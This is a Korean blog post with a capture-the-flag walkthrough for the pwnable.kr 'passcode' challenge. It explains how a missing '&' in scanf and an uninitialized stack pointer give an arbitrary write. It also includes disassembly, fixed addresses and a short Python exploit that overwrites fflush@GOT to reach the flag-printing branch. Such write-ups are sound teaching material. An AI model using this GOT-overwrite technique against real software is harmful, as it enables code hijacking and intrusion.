---
title: "pwnable.kr [Toddler's Bottle] passcode 풀이 — 초기화되지 않은 포인터와 GOT 덮어쓰기"
description: "pwnable.kr passcode 문제를 REA로 분석해 scanf(\"%d\", passcode1)의 포인터 버그와 name 버퍼와의 스택 겹침을 밝히고, fflush@GOT를 덮어 임의 코드로 분기시킨 과정을 기록한다."
date: 2026-10-16
category: Security
tags: [pwnable.kr, pwn, wargame, got-overwrite, scanf, reverse-engineering]
---

[pwnable.kr](https://pwnable.kr) **Toddler's Bottle**의 `passcode`.
"컴파일 경고는 떴지만 누가 신경 써?"라는 설명 그대로, **컴파일러 경고를 무시한 포인터 버그**를
파고드는 문제다. `scanf`에 `&` 를 빠뜨린 한 글자가 **임의 주소 쓰기**로 이어진다.
[fd](/LeJus-Blog/posts/2026-10-16-pwnable-kr-fd/) · [collision](/LeJus-Blog/posts/2026-10-16-pwnable-kr-collision/) · [bof](/LeJus-Blog/posts/2026-10-16-pwnable-kr-bof/)에 이어, REA로 주소를 확정해 풀었다.

![pwnable.kr Toddler's Bottle (passcode)](/LeJus-Blog/images/passcode-challenge.jpg)

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 카테고리 | Toddler's Bottle |
| 접속 | `nc pwnable.kr 10004` (passcode 바이너리 직접 실행) |
| 특징 | **non-PIE** 32-bit ELF → 주소 고정, GOT 덮어쓰기에 유리 |

## 2. 소스 코드

```c
void login(){
	int passcode1;
	int passcode2;
	printf("enter passcode1 : ");
	scanf("%d", passcode1);          // ← & 가 없다! passcode1의 '값'을 주소로 사용
	fflush(stdin);
	printf("enter passcode2 : ");
	scanf("%d", passcode2);
	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
		setregid(getegid(), getegid());
		system("/bin/cat flag");     // ← 승리 지점
	}
	else{ printf("Login Failed!\n"); exit(0); }
}
void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);            // name[100] 채움
	printf("Welcome %s!\n", name);
}
int main(){ welcome(); login(); ... }
```

### 두 개의 버그

1. **`scanf("%d", passcode1)`** — `&passcode1`이어야 하는데 `&`가 없다.
   `passcode1`의 *값* 을 주소로 보고 거기에 입력한 정수를 **쓴다**. (임의 주소 쓰기)
2. `passcode1`은 **초기화되지 않았다**. 그 값은 직전에 호출된 `welcome()`의
   스택 잔재 — 즉 `name` 버퍼의 특정 바이트다. 따라서 **`name`으로 `passcode1` 값을 조종**할 수 있다.

## 3. REA 정적 분석 — 스택 겹침과 주소 확정

REA(Hopper) 디스어셈블리로 두 프레임의 변수 위치를 읽었다.

```nasm
; welcome() : scanf("%100s", name)
0x8049324: lea eax, dword [ebp+var_70]   ; name = ebp-0x70

; login() : 첫 scanf("%d", passcode1)
0x804921e: push dword [ebp+var_10]       ; passcode1 = ebp-0x10  (값을 주소로 push)
0x8049228: call scanf
0x804923c: call fflush                    ; ← 직후 fflush(stdin) 호출
...
; 성공 분기 (승리 지점)
0x8049292: ... puts("Login OK!")
0x80492b2: call setregid
0x80492c4: call system                    ; system("/bin/cat flag")
```

`welcome`와 `login`은 `main`에서 같은 깊이로 호출되어 **ebp가 같다**. 따라서:

```
name      = ebp - 0x70
passcode1 = ebp - 0x10
→ passcode1 은 name 의 (0x70 - 0x10) = 0x60 = 96 번째 바이트와 겹친다
```

즉 **`name[96:100]` 4바이트가 그대로 `passcode1`의 값**이 된다.

fflush의 PLT 썽크도 읽어 GOT 주소를 확정했다.

```nasm
0x8049060: jmp dword [0x0804c014]   ; fflush@GOT = 0x0804c014  (raw: ff 25 14 c0 04 08)
```

## 4. 익스플로잇 설계 (GOT 덮어쓰기)

흐름을 엮으면:

1. `welcome()`에서 `name` = `"A"×96 + p32(0x0804c014)` 입력
   → `passcode1`의 값 = **fflush@GOT 주소(0x0804c014)**.
2. `login()`의 첫 `scanf("%d", passcode1)`에서 **`0x08049292`의 10진수(134517394)** 입력
   → `scanf`가 그 값을 `*0x0804c014`(= fflush@GOT)에 쓴다.
3. 바로 다음 `fflush(stdin)` 호출 → `jmp [fflush@GOT]` → **0x08049292로 점프**
   → `setregid` → `system("/bin/cat flag")` → 플래그 출력.

passcode2는 입력할 필요도 없이, `fflush` 한 번으로 승리한다.

```python
name      = b"A"*96 + struct.pack("<I", 0x0804c014)   # fflush@GOT
passcode1 = str(0x08049292).encode()                  # = 134517394  (win addr)
sock.sendall(name + b"\n")
sock.sendall(passcode1 + b"\n")   # fflush@GOT 덮임 -> system("/bin/cat flag")
```

실행 결과(요약):

```console
enter you name : Welcome AAded...AA<\x14\xc0\x04\x08>!
enter passcode1 : Login OK!
<플래그 출력 — 공개 글에서는 가림>
```

> 원격 `nc pwnable.kr 10004`에서 셸 권한(passcode_pwn)으로 플래그를 읽어 해결했다.
> 값은 가린다 — pwnable.kr의 **Submit flag** 에 직접 입력하면 점수가 올라간다.

## 5. 정리

- `scanf`의 `&` 누락 = **임의 주소 쓰기**. 컴파일러 경고(`format '%d' expects int *`)를 무시한 대가다.
- 초기화 안 된 `passcode1`이 **직전 함수 `name` 버퍼와 스택을 공유**(오프셋 96)하는 점을 REA로 확정했다.
- **non-PIE**라 `fflush@GOT(0x0804c014)`·승리 주소(`0x08049292`)가 고정 → GOT를 덮어 분기를 탈취했다.
- 핵심 기법: **GOT overwrite** — 라이브러리 함수 호출을 원하는 코드로 가로채기.

> 바이너리가 "무엇을 호출하는가"(PLT/GOT)를 읽으면, 그 호출을 어디로 돌릴 수 있는지가 보인다.
